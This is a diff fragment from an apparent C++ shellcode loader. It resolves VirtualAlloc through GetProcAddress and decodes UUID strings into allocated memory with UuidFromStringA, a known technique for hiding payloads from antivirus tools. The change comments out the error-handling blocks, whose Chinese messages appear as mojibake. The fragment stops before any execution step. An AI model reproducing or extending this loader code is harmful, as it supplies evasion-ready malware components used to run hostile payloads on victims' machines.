@@ -10,22 +10,22 @@ int main(int argc, char* argv) {
 	typedef LPVOID(WINAPI* oldVirtualAlloc)(LPVOID lpAddress, SIZE_T dwSize, DWORD  flAllocationType, DWORD  flProtect);
 	oldVirtualAlloc VA = (oldVirtualAlloc)GetProcAddress(GetModuleHandleA("kernel32.dll"), "VirtualAlloc");
 	LPVOID handle = VA(0, group * 16, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
-	if (handle == NULL) {
-		std::cout << "ÉêÇëÄÚ´æÊ§°Ü" << std::endl;
-		return -1;
-	}
+	// if (handle == NULL) {
+	// 	std::cout << "ç”³è¯·å†…å­˜å¤±è´¥" << std::endl;
+	// 	return -1;
+	// }
 
 	DWORD_PTR rwxpage = (DWORD_PTR)handle;
 	for (int i = 0; i < group; i++) {
 		// std::cout << uuid[i] << std::endl;
 		// std::cout << (in6_addr*)rwxpage << std::endl;
 		RPC_STATUS res = UuidFromStringA((RPC_CSTR)uuid[i], (UUID*)rwxpage);
-		if (res != RPC_S_OK) {
-			std::cout << "ÄÚ´æ×ª»»Ê§°Ü" << std::endl;
-			std::cout << GetLastError() << std::endl;
-			CloseHandle(handle);
-			return -1;
-		}
+		// if (res != RPC_S_OK) {
+		// 	std::cout << "å†…å­˜è½¬æ¢å¤±è´¥" << std::endl;
+		// 	std::cout << GetLastError() << std::endl;
+		// 	CloseHandle(handle);
+		// 	return -1;
+		// }
 		rwxpage += 16;
 	}
 
